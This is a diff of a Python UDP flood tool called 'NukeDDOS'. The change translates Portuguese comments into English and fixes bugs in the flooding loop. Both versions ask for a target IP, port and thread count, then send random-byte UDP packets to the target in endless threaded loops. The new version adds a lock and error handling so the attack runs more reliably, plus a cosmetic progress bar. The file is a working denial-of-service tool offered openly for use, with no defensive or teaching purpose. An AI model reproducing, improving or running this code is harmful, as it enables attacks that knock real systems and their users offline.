@@ -5,59 +5,48 @@ import socket
 import random
 import threading
 from datetime import datetime
-from colorama import Fore, Back, Style, init
+from colorama import init, Fore
 
-# Inicializa o Colorama para texto colorido
-init(autoreset=True)
+# Initialize colorama
+init()
 
-# Obtém a data e hora atuais
-now = datetime.now()
-hour = now.hour
-minute = now.minute
-day = now.day
-month = now.month
-year = now.year
-
-# Cria o socket para o ataque
+# Initial settings
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(1490)
+data = random._urandom(1024)
+sent = 0
+lock = threading.Lock()
 
-# Limpa a tela e exibe o título do ataque em roxo
+# Configuration interface
 os.system("clear")
-os.system("figlet -f slant 'NukeDDOS'")
-print(Fore.MAGENTA + Style.BRIGHT + "NukeDDOS")
-
-# Exibe o autor e o link do GitHub
+os.system("figlet -f slant NukeDDOS")
 print(Fore.MAGENTA + "Author   : Laila19")
-print(Fore.MAGENTA + "GitHub   : https://github.com/lailacypher")
+print("github   : https://github.com/lailacypher")
 print()
+ip = input("Target IP : ").strip()
+port = int(input("Port      : ").strip())
+threads = int(input("Threads   : ").strip())
 
-# Solicita o IP, porta e número de threads
-ip = input("Target IP: ")
-port = int(input("Port: "))
-threads = int(input("Number of Threads: "))
-
-# Função para realizar o ataque
-def attack():
-    sent = 0
-    while True:
-        sock.sendto(bytes, (ip, port))  # Envia o pacote para o IP e porta do alvo
-        sent += 1
-        port = port + 1  # Incrementa a porta para cada pacote enviado
-        print(f"{Fore.MAGENTA}Sent {sent} packet(s) to {ip} through port: {port}")
-        
-        if port == 65534:
-            port = 1  # Volta a porta para 1 após atingir o limite
-
-# Limpa a tela novamente e exibe o título 'Attack Starting' em roxo
+# Initial progress bar
 os.system("clear")
-os.system("figlet -f slant 'Attack Starting'")
-print(Fore.MAGENTA + "Starting the attack...")
+os.system("figlet -f slant Attack Starting")
+progress = ["[                    ] 0%", "[=====               ] 25%", "[==========          ] 50%", "[===============     ] 75%", "[====================] 100%"]
+for step in progress:
+    print(Fore.MAGENTA + step)
+    time.sleep(1)
 
-# Atraso antes de iniciar os threads
-time.sleep(2)
+# Function for attack
+def attack():
+    global sent
+    while True:
+        try:
+            sock.sendto(data, (ip, port))
+            with lock:
+                sent += 1
+                print(f"Packets {sent} sent successfully to {ip} through port {port}")
+        except Exception as e:
+            print(f"Error sending packet: {e}")
 
-# Inicia os threads para realizar o ataque
+# Starting threads
 for _ in range(threads):
-    t = threading.Thread(target=attack)
-    t.start()
+    thread = threading.Thread(target=attack)
+    thread.start()
